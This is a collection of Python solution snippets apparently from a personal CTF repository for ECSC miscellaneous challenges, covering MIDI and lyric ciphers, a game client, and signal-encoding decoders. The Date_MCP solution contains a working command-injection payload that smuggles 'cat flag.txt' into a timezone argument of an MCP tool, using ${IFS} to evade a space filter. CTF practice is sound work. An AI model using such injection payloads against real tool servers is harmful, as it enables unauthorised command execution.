            json.dump(analysis, f, indent=4)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_functions(self, variable, under=False):
        &#34;&#34;&#34;
        Get all functions of a variable
        &#34;&#34;&#34;

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith(&#34;__&#34;)))
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_attributes(self, variable):
        &#34;&#34;&#34;
        Get all attributes of a variable
        &#34;&#34;&#34;

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith(&#34;__&#34;))
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def get_instruments(self):
        &#34;&#34;&#34;
        Returns a list of instruments in the MIDI file.
        &#34;&#34;&#34;

        for instrument in self.midi_data.instruments:
            print(instrument)
        return self.midi_data.instruments

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/solution.py
    def main(self):
        self.init_some_values()
        self.midi_data = pretty_midi.PrettyMIDI(self.challenge_file.as_posix())
        instruments = self.midi_data.instruments

        piano = instruments[1]
        notes = [note.pitch for note in piano.notes]

        chosen = [notes[c] for c in self.key]

        flag = &#34;&#34;.join([chr(c) for c in chosen])

        flag = flag[:4] + &#34;{&#34; + flag[4:] + &#34;}&#34;
        print(&#34;Flag:&#34;, flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def load_lyrics(self):

        files = [
            &#34;lyrics_partial.txt&#34;,
            &#34;lyrics.txt&#34;,
            &#34;greek_lyrics.txt&#34;,
            &#34;genius_lyrics.txt&#34;,
        ]

        with open(self.folfil(&#34;data&#34;, files[1]), &#34;r&#34;) as f:
            lyrics = f.read().strip()
        return lyrics

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def dictionary_analysis(self, lyrics):
        d = defaultdict(list)
        for i, c in enumerate(lyrics):
            d[c].append(i)
        return d

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def print_dictionary(self, d):
        sorted_items = sorted(d.items(), key=lambda x: x[0])
        for key, value in sorted_items:
            print(f&#34;{key}: {value}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transpose(self, lyrics, offset, wrap=True):
        if offset &gt; len(lyrics):
            offset = offset % len(lyrics)

        result = lyrics[offset:]
        if wrap:
            result += lyrics[:offset]

        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyric_transformation(self, lyrics):

        punctuation_used = set()
        for c in lyrics:
            if c not in ascii_letters + digits + &#34; &#34;:
                punctuation_used.add(c)

        lyrics_only_letters = &#34;&#34;.join([c for c in lyrics if c.isalnum()])
        lyrics_with_spaces = lyrics.replace(&#34;\n&#34;, &#34; &#34;)
        lyrics_without_punctuation = lyrics_with_spaces.replace(&#34;&#39;&#34;, &#34;&#34;).replace(
            &#34;,&#34;, &#34;&#34;
        )
        return lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_all(self):
        &#34;&#34;&#34;
        Description:
            This function generates all possible combinations of lyrics transformations
            based on the provided replace_combos and control_combos.
            It uses itertools.product to create combinations of the specified number
            of transformations, allowing for flexible lyric manipulation.
        Returns:
            list: A list of transformed lyrics combinations.
        &#34;&#34;&#34;
        lyrics = self.load_lyrics()
        control_combos = self.creating_control_combos(
            start=0, end=1, number=len(self.replace_combos)
        )
        return [
            self.lyrics_transformation(lyrics, self.replace_combos, control)
            for control in control_combos
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def creating_control_combos(self, start=0, end=1, number=8):
        if start &gt;= end:
            raise ValueError(&#34;Start must be less than end.&#34;)
        if number &lt; 1:
            raise ValueError(&#34;Number of combinations must be at least 1.&#34;)
        return list(itertools.product(range(start, end + 1), repeat=number))

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def lyrics_transformation(self, lyrics, replace_combos, control_combos=None):
        if control_combos is None:
            return lyrics

        for control, combo in zip(control_combos, replace_combos):
            if control:
                if len(combo[0]) &gt; 1:
                    lyrics = lyrics.replace(*combo[0]).replace(*combo[1])
                else:
                    lyrics = lyrics.replace(*combo)
        return lyrics

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def brute_transpose_find_flag(
        self,
        lyrics: str,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        &#34;&#34;&#34;
        Description:
            For the lyrics given

        Args:
            lyrics (str): Lyrics given
            partial_flag (str): partial flag to look
            verbose (bool, optional): _description_. Defaults to False.

        Returns:
            str: possible flag
        &#34;&#34;&#34;

        for i in range(len(lyrics)):
            transposed = self.lyric_transpose(lyrics, i, wrap=wrap)
            if verbose and i % 100 == 0:
                print(f&#34;Trying offset: {i}&#34;)
            temp_flag = self.position_cipher(transposed, keys)
            if &#34;ecsc&#34; in temp_flag.lower() or self.check_for_rot(
                temp_flag, partial_flag
            ):
                print(f&#34;Found flag: {temp_flag} - Offset: {i}&#34;)
                return temp_flag

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def check_for_rot(self, text, partial=&#34;ecsc&#34;):
        &#34;&#34;&#34;
        Description:
            Checks if the text is a rotation of &#34;ecsc&#34;.
            This function checks if the first four characters of the text
            can be rearranged to form the string &#34;ecsc&#34;. It does this by
            comparing the ASCII values of the characters in the text with
            the ASCII values of the characters in &#34;ecsc&#34;. If the conditions
            are met, it returns True, indicating that the text is a rotation
            of &#34;ecsc&#34;. Otherwise, it returns False.
            This function is useful for identifying specific patterns in the text
            that match the structure of &#34;ecsc&#34;, which could be relevant in certain

            Challenge_specific
        Args:
            text (_type_): _description_

        Returns:
            _type_: _description_
        &#34;&#34;&#34;

        if len(partial) != 4:
            raise ValueError(
                &#34;Partial must be exactly 4 characters long. Challenge_specific&#34;
            )
        text = text.lower()

        check1 = (ord(partial[0]) - ord(partial[1])) == (ord(text[0]) - ord(text[1]))
        check2 = (ord(partial[2]) - ord(partial[1])) == (ord(text[2]) - ord(text[1]))
        check3 = ord(text[3]) == ord(text[1])

        return check1 and check2 and check3

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def position_cipher(self, text: str, keys: list):
        &#34;&#34;&#34;
        Description:
            This function takes a text and a list of keys, and returns a new string
            where each character in the text is replaced by the character at the
            corresponding index in the keys list. If the index exceeds the length of
            the text, it wraps around using modulo operation.
        Args:
            text (str): The input text to be transformed.
            keys (list): A list of integers representing the positions in the text.
        Returns:
            str: A new string formed by replacing characters in the text based on the keys.
        &#34;&#34;&#34;

        return &#34;&#34;.join(text[i % len(text)] for i in keys)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def bruteforce_all_lyrics(
        self,
        all_lyrics: list,
        partial_flag: str,
        keys: list,
        verbose: bool = False,
        wrap: bool = True,
    ):
        results = []
        for lyric_i, lyrics in enumerate(all_lyrics):
            if verbose:
                print(f&#34;Processing lyrics {lyric_i + 1}/{len(all_lyrics)}&#34;)
            result = self.brute_transpose_find_flag(
                lyrics=lyrics,
                partial_flag=partial_flag,
                keys=keys,
                verbose=verbose,
                wrap=wrap,
            )
            if result:
                results.append([lyric_i, result])

        return results

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def init_some_values(self):
        self.key = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]

        self.replace_combos = [
            (&#34; &#34;, &#34;&#34;),
            (&#34;,&#34;, &#34; &#34;),
            ((&#34;,&#34;, &#34; &#34;), (&#34;&#39;&#34;, &#34; &#34;)),
            ((&#34;,&#34;, &#34;&#34;), (&#34;&#39;&#34;, &#34;&#34;)),
            (&#34;,&#34;, &#34;&#34;),
            (&#34;&#39;&#34;, &#34; &#34;),
            (&#34;&#39;&#34;, &#34;&#34;),
            (&#34;\n&#34;, &#34; &#34;),
            (&#34;\n&#34;, &#34;&#34;),
        ]

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def another_attempt(self):

        lyrics = self.load_lyrics()

        lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation = (
            self.lyric_transformation(lyrics)
        )

        print(lyrics_only_letters)
        print(lyrics_with_spaces)
        print(lyrics_without_punctuation)

        # flag = self.bruteforce(lyrics, self.key)
        # print(flag)
        # flag = self.bruteforce(lyrics_only_letters, self.key)
        # print(flag)
        flag = self.brute_transpose_find_flag(lyrics_with_spaces, self.key)
        print(flag)
        flag = self.brute_transpose_find_flag(lyrics_without_punctuation, self.key)
        print(flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/position_cipher_functions.py
    def main(self):

        self.init_some_values()

        all_lyrics = self.lyrics_all()

        partial_flag = &#34;ecsc&#34;

        results = self.bruteforce_all_lyrics(
            all_lyrics, partial_flag, keys=self.key, verbose=True, wrap=True
        )
        if results:
            for lyric_i, result in results:
                print(f&#34;Lyric {lyric_i + 1}: {result}&#34;)
        else:
            print(&#34;No results found.&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def bruteforcing_failed(self):

        flag = &#34;&#34;
        for i in range(len(self.KEY)):
            # flag += chr(self.KEY[i] ^ ord(variables[i % len(variables)]))
            flag += ascii_letters[(self.KEY[i]) % len(ascii_letters)]
        self.flag = flag

        print(self.flag)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def main(self):

        # variables = &#34;MThdMTrk&#34;
        # variables = &#34;MTrk&#34;

        self.KEY = [
            7,
            58,
            391,
            58,
            129,
            80,
            537,
            80,
            389,
            33,
            80,
            107,
            522,
            391,
            389,
            148,
            386,
            522,
            389,
            58,
            240,
            240,
            107,
            1,
        ]
        self.music21_analysis()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Youve_got_a_flag_in_me/payloads/attempt_01.py
    def music21_analysis(self):
        # midi_file_path = &#34;/mnt/data/flag.midi&#34;
        midi = converter.parse(self.challenge_file)

        # Analyze structure and extract textual representation
        notes_data = []
        for element in midi.flatten():
            # print(element)
            notes_data.append(str(element))
            # if isinstance(element, note.Note):
            #     notes_data.append(str(element.pitch))
            # elif isinstance(element, chord.Chord):
            #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

        # Show first 50 note/chord representations
        with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
            import json

            json.dump(notes_data, f, indent=4)
        print(notes_data)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_send(
        self,
        text,
        lines=None,
        text_until=None,
        display=False,
        save=False,
        ansi_escape=False,
    ):
        &#34;&#34;&#34;
        Description:
            Receives lines and sends a response.
            It can receive a number or lines, and/or specific text.
            If save is True, it saves the output of the menu in a list and returns it.
            If display is True, it prints the output of everything received.

        Args:
            choice (int or str): Choice to send to the menu
            menu_num (int, optional): Number of options printed in the menu. Defaults to None.
            menu_text (str, optional): Text that the menu asks before sending your choice. Defaults to None.
            display (bool, optional): Variable to print every received line. Defaults to False.
            save (bool, optional): . Defaults to False.
        Returns:
            list: List of output of the menu if save is True
        &#34;&#34;&#34;
        if save:
            result = []

        if lines is None:
            lines = 0

        out_lines = self.recv_lines(number=lines, display=display, save=save)

        if save:
            result.extend(out_lines)

        if text_until:
            out_text_until = self.recv_until(text=text_until, ansi_escape=ansi_escape)

        if ansi_escape:
            out_text_until = self.extract_printable_with_spaces(
                out_text_until.decode(&#34;utf-8&#34;)
            )

        if save:
            result.append(out_text_until)

        if display:
            print(out_text_until)

        self.send(text)

        if save:
            return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def recv_until(self, text, **kwargs) -&gt; bytes:
        &#34;&#34;&#34;
        Description:
            Receive data until one of `delims`(text) provided is encountered. It encodes the text before sending it.
            Wrapper for self.conn.recvuntil(text.encode())
            Can also drop the ending if drop is True. If the request is not satisfied before ``timeout`` seconds pass, all data is buffered and an empty string (``&#39;&#39;``) is returned.
        Args:
            text (str): Text to receive until
            **kwargs: Additional keyword arguments to pass to the recv
                - drop (bool, optional): Drop the ending.  If :const:`True` it is removed from the end of the return value. Defaults to False.
                - timeout (int, optional): Timeout in seconds. Defaults to default.

        Raises:
            exceptions.EOFError: The connection closed before the request could be satisfied

        Returns:
            A string containing bytes received from the socket,
            or ``&#39;&#39;`` if a timeout occurred while waiting.

        &#34;&#34;&#34;

        # Handles the connection closed before the request could be satisfied
        if kwargs.get(&#34;ansi_escape&#34;, False):
            text = self.simulate_ansi_typing(text, escape_codes=False)
        kwargs = {k: v for k, v in kwargs.items() if k not in [&#34;ansi_escape&#34;]}
        try:
            return self.conn.recvuntil(text.encode(), **kwargs)
        except EOFError:
            print(&#34;Connection closed before the request could be satisfied&#34;)
            return b&#34;&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def get_welcome_message(self):
        self.recv_lines(2)
        time.sleep(0.5)
        self.recv_lines(4)
        time.sleep(0.5)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def extract_printable_with_spaces(self, text):
        # Remove ANSI escape sequences (e.g., \x1b[?25l, \x1b[?25h, \x1b[K, \x1b[1C, etc.)
        # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
        # ansi_escape = re.compile(r&#34;\x1b\[[0-9;?]*[A-Za-z]&#34;)
        ansi_escape = re.compile(r&#34;\x1b\[.*?[@-~]&#34;)
        cleaned = ansi_escape.sub(&#34;&#34;, text)

        return cleaned

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def simulate_ansi_typing(self, text, escape_codes=True):
        result = &#34;&#34;
        for char in text:
            if char == &#34; &#34;:
                # Simulate clearing and moving cursor for space too
                result += &#34;\x1b[?25l\x1b[K\x1b[1C\x1b[?25h&#34;
            else:
                result += f&#34;\x1b[?25l{char}\x1b[?25h&#34;
        # result += &#34;\n&#34;  # Optional: simulate Enter
        if escape_codes:
            # Add ANSI escape codes to simulate typing
            return repr(result)
        return result

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_round(self):
        time.sleep(1)
        choice = [1, 2][0]
        # Get the visible number
        visible_number = self.recv_lines(1, save=True)[0]
        # print(visible_number)
        print(self.extract_printable_with_spaces(visible_number.decode(&#34;utf-8&#34;)))
        # visible_number = int(visible_number.split()[-1])
        # User choice
        # text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
        text_until = &#34;&gt; &#34;
        # out = self.recv_send(
        #     text_until=text_until,
        #     lines=5,
        #     text=choice,
        #     display=True,
        #     save=True,
        # )
        out = self.recv_lines(6, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))

        out = self.recv_until(text=text_until, ansi_escape=False)
        # print(out)
        self.send(choice)
        # for line in out:
        #     print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))
        out = self.recv_lines(2, save=True)
        for line in out:
            print(self.extract_printable_with_spaces(line.decode(&#34;utf-8&#34;)))

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def play_game(self):
        self.choice_text = &#34;The number on the table is &#34;
        self.initiate_connection()
        self.get_welcome_message()

        # Some kind of loop probably
        self.play_round()

        round_result = self.recv_lines(1, save=True)[0]
        print(round_result)
        if &#34;10/10&#34; in round_result:
            self.recv_lines(3, display=True)

        self.conn.close()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def testing_ansii_escape(self):
        # self.play_game()

        text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
        print(text_until)
        phrase = b&#34;The number on the table is 31&#34;
        print(f&#34;Simulating typing: {phrase}&#34;)
        simulated_typing = self.simulate_ansi_typing(phrase)
        print(f&#34;Simulated typing output: {simulated_typing}&#34;)

        encoded = &#34;\x1b[?25lT\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25lu\x1b[?25h\x1b[?25lm\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25lr\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lo\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25la\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25ll\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25li\x1b[?25h\x1b[?25ls\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25l3\x1b[?25h\x1b[?25l1\x1b[?25h\n&#34;

        print(f&#34;Encoded output: {encoded}&#34;)
        # Simulate sending the encoded string
        encoded = self.extract_printable_with_spaces(encoded)
        print(f&#34;Extracted printable output: {encoded}&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/High-Low/payloads/solution.py
    def main(self):
        self.play_game()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def initialize_values(self):
        # 2) Initialize MCP
        self.init = {
            &#34;jsonrpc&#34;: &#34;2.0&#34;,
            &#34;id&#34;: 1,
            &#34;method&#34;: &#34;initialize&#34;,
            &#34;params&#34;: {
                &#34;protocolVersion&#34;: &#34;2024-11-05&#34;,
                &#34;capabilities&#34;: {},
                &#34;clientInfo&#34;: {
                    &#34;name&#34;: &#34;challenge_solution&#34;,
                    &#34;version&#34;: &#34;1.0&#34;,
                },
            },
        }
        self.base_url = f&#34;http://{self.url}:{self.port}&#34;
        self.sse_url = f&#34;{self.base_url}/sse&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_request(self):
        self.session = requests.Session()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def setup_sse(self, sse_url):
        self.messages = SSEClient(sse_url, session=self.session)
        first = next(self.messages).data
        m = re.search(r&#34;session_id=([a-f0-9]+)&#34;, first)
        if not m:
            raise SystemExit(&#34; Couldn&#39;t get session_id&#34;)
        self.sid = m.group(1)
        self.post_url = f&#34;{self.base_url}/messages/?session_id={self.sid}&#34;

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def exploit(self):
        # 3) Exploit: call get_current_time with injection
        # Note: no literal spaces allowed, so we use ${IFS} to stand in for a space.
        injection = &#39;Europe/Athens&#34;;cat${IFS}flag.txt;#&#39;
        cat_call = {
            &#34;jsonrpc&#34;: &#34;2.0&#34;,
            &#34;id&#34;: 2,
            &#34;method&#34;: &#34;tools/call&#34;,
            &#34;params&#34;: {&#34;name&#34;: &#34;get_current_time&#34;, &#34;arguments&#34;: {&#34;tz&#34;: injection}},
        }

        self.session.post(self.post_url, json=cat_call)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def tools_result(self):
        # 4) Listen for the tools result (either an &#34;id&#34;:2 result or a tools/result notification)
        for msg in self.messages:
            try:
                pkt = json.loads(msg.data)
            except json.JSONDecodeError:
                continue

            # Case A: direct JSON-RPC reply
            if pkt.get(&#34;id&#34;) == 2 and &#34;result&#34; in pkt:
                out = pkt[&#34;result&#34;]
            # Case B: a tools/result notification
            elif (
                pkt.get(&#34;method&#34;) == &#34;tools/result&#34;
                and pkt.get(&#34;params&#34;, {}).get(&#34;id&#34;) == 2
            ):
                out = pkt[&#34;params&#34;][&#34;result&#34;]
            else:
                continue

            # out might be a string or a more structured object.
            text = out if isinstance(out, str) else json.dumps(out)

            # Search for our ECSC flag
            m2 = re.search(r&#34;(ECSC\{.*?\})&#34;, text)
            if m2:
                flag = m2.group(1)
                print(&#34;Flag found:&#34;, flag)
            else:
                print(&#34;No flag in tool output. Raw output:&#34;)
                print(text)
            break
        return flag

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def interacting_with_mcp(self):
        self.session.post(self.post_url, json=self.init)
        # wait for init reply
        for msg in self.messages:
            data = json.loads(msg.data)
            if data.get(&#34;id&#34;) == 1:
                # send initialized notification
                self.session.post(
                    self.post_url,
                    json={&#34;jsonrpc&#34;: &#34;2.0&#34;, &#34;method&#34;: &#34;notifications/initialized&#34;},
                )
            break

        self.exploit()
        flag = self.tools_result()
        if flag:
            print(f&#34;Flag: {flag}&#34;)
        else:
            print(&#34; Flag not found&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Date_MCP/payloads/solution.py
    def main(self):
        self.initialize_values()
        self.setup_request()
        self.setup_sse(self.sse_url)
        self.interacting_with_mcp()

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def saving_requests(self):
        &#34;&#34;&#34;
        Save the requests made during the challenge to a file.
        This can help in debugging or understanding the flow of the challenge.
        &#34;&#34;&#34;

        setted_requests = set()
        for req in self.requests:
            if isinstance(req, list) and len(req) &gt; 1:
                setted_requests.add(tuple(req))
            elif isinstance(req, str):
                setted_requests.add((req,))

        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;r&#34;) as f:
            requests = json.load(f)
        with open(self.folfil(&#34;data&#34;, &#34;requests.json&#34;), &#34;w&#34;) as f:
            if not isinstance(requests, list):
                requests = []
            requests.extend(setted_requests)
            json.dump(requests, f, indent=4)
        print(f&#34;Saved {len(self.requests)} requests to data/requests.json&#34;)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def bits_to_ascii(self, bits):
        &#34;&#34;&#34;
        Convert a list of bits (ints) to ASCII string.
        Assumes 8 bits per character, MSB first.
        &#34;&#34;&#34;
        if len(bits) % 8 != 0:
            raise ValueError(&#34;Number of bits is not a multiple of 8&#34;)
        chars = []
        for i in range(0, len(bits), 8):
            byte = bits[i : i + 8]
            val = 0
            for bit in byte:
                val = (val &lt;&lt; 1) | bit
            chars.append(chr(val))
        return &#34;&#34;.join(chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_nrzi(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a NRZ-I encoded bit string to ASCII.
        NRZ-I: A &#39;1&#39; means a transition, &#39;0&#39; means no transition.
        The first bit is assumed to be the initial signal level (0 or 1).
        &#34;&#34;&#34;
        # Convert string to list of ints
        bits = list(map(int, encoded_bits))
        decoded_bits = []
        # Initial signal level
        current_level = bits[0]
        decoded_bits.append(current_level)
        for i in range(1, len(bits)):
            if bits[i] == 1:
                # Transition: invert current level
                current_level = 1 - current_level
            # else no transition, current_level stays the same
            decoded_bits.append(current_level)
        # Now decoded_bits is the original bit stream
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_manchester(self, encoded_bits):
        &#34;&#34;&#34;
        Decode Manchester encoded bit string to ASCII.
        Manchester encoding: each bit is two bits:
        &#39;01&#39; -&gt; 0
        &#39;10&#39; -&gt; 1
        &#34;&#34;&#34;
        bits = encoded_bits
        if len(bits) % 2 != 0:
            raise ValueError(&#34;Manchester encoded bits length must be even&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 2):
            pair = bits[i : i + 2]
            if pair == &#34;01&#34;:
                decoded_bits.append(0)
            elif pair == &#34;10&#34;:
                decoded_bits.append(1)
            else:
                raise ValueError(f&#34;Invalid Manchester encoding pair: {pair}&#34;)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_hamming74(self, encoded_bits):
        &#34;&#34;&#34;
        Decode a Hamming (7,4) encoded bit string to ASCII.
        Each 7 bits contain 4 data bits and 3 parity bits.
        Returns ASCII decoded string.
        &#34;&#34;&#34;

        def hamming_correct_and_extract(bits7):
            # bits7 is a list of 7 bits (ints)
            # Hamming (7,4) bit positions (1-based):
            # Positions: 1 2 3 4 5 6 7
            # Bits:      p1 p2 d1 p3 d2 d3 d4
            # parity bits: p1=bit1, p2=bit2, p3=bit4
            p1, p2, d1, p3, d2, d3, d4 = bits7
            # Calculate syndrome bits
            s1 = p1 ^ d1 ^ d2 ^ d4
            s2 = p2 ^ d1 ^ d3 ^ d4
            s3 = p3 ^ d2 ^ d3 ^ d4
            syndrome = (s3 &lt;&lt; 2) | (s2 &lt;&lt; 1) | s1
            # Correct error if syndrome != 0
            if syndrome != 0:
                error_pos = syndrome - 1  # zero-based index
                bits7[error_pos] ^= 1
                # Reassign corrected bits
                p1, p2, d1, p3, d2, d3, d4 = bits7
            # Extract data bits
            return [d1, d2, d3, d4]

        bits = list(map(int, encoded_bits))
        if len(bits) % 7 != 0:
            raise ValueError(&#34;Hamming (7,4) encoded bits length must be multiple of 7&#34;)
        decoded_bits = []
        for i in range(0, len(bits), 7):
            block = bits[i : i + 7]
            data_bits = hamming_correct_and_extract(block)
            decoded_bits.extend(data_bits)
        return self.bits_to_ascii(decoded_bits)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def decode_uart(
        self, encoded_bits, baud_rate=9600, data_bits=8, parity=None, stop_bits=1
    ):
        &#34;&#34;&#34;
        Decode UART encoded bit string to ASCII.
        Assumes:
        - 1 start bit (0)
        - 8 data bits (LSB first)
        - No parity by default
        - 1 stop bit (1)
        encoded_bits is a string of bits representing UART frames concatenated.
        &#34;&#34;&#34;
        bits = list(map(int, encoded_bits))
        frame_len = 1 + data_bits + (1 if parity else 0) + stop_bits
        if len(bits) % frame_len != 0:
            raise ValueError(
                &#34;UART encoded bits length is not a multiple of frame length&#34;
            )
        decoded_chars = []
        for i in range(0, len(bits), frame_len):
            frame = bits[i : i + frame_len]
            start_bit = frame[0]
            if start_bit != 0:
                raise ValueError(&#34;Invalid start bit in UART frame&#34;)
            data = frame[1 : 1 + data_bits]
            # Parity check skipped if parity is None
            # Stop bits check
            stop = frame[1 + data_bits + (1 if parity else 0) :]
            if any(s != 1 for s in stop):
                raise ValueError(&#34;Invalid stop bit(s) in UART frame&#34;)
            # Convert data bits (LSB first) to int
            val = 0
            for idx, bit in enumerate(data):
                val |= bit &lt;&lt; idx
            decoded_chars.append(chr(val))
        return &#34;&#34;.join(decoded_chars)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def getting_round(self):
        round_text = self.recv_until(&#34;&gt; &#34;)
        round_text = round_text.decode()
        round_text = round_text.strip(&#34;\n&gt; &#34;)
        round_text = round_text.split(&#34;] &#34;)

        print(round_text)
        self.requests.append(round_text)
        print(self.requests)
        # print(round_text)
        if len(round_text) &lt; 2:
            print(&#34;Unexpected round format or missing data&#34;)
            print(round_text)
            sys.exit(0)
            # raise ValueError(&#34;Unexpected round format or missing data&#34;)
        match round_text[1]:
            case &#34;[UART&#34;:
                bits = round_text[2]
                decoded = self.decode_uart(bits)
            case &#34;[NRZI&#34;:
                bits = round_text[2]
                decoded = self.decode_nrzi(bits)
            case &#34;[Manchester&#34;:
                bits = round_text[2]
                decoded = self.decode_manchester(bits)
            case &#34;[Hamming74&#34;:
                bits = round_text[2]
                decoded = self.decode_hamming74(bits)
            case _:
                raise ValueError(f&#34;Unknown encoding type: {round_text[0]}&#34;)
        print(f&#34;Decoded: {decoded}&#34;)
        self.send(decoded)

        # /home/figaro/CTF/Categories/Miscellaneous/ECSC/Pot_Pouri/payloads/attempt_03.py
    def main(self):

        self.requests = []

        # text = &#34;011011101110000100111001000010010011111011110000&#34;
        # decoded = self.decode_nrzi(text)

        # text = &#34;100110010110101000011000111110011000101010&#34;
        # decoded = self.decode_hamming74(text)
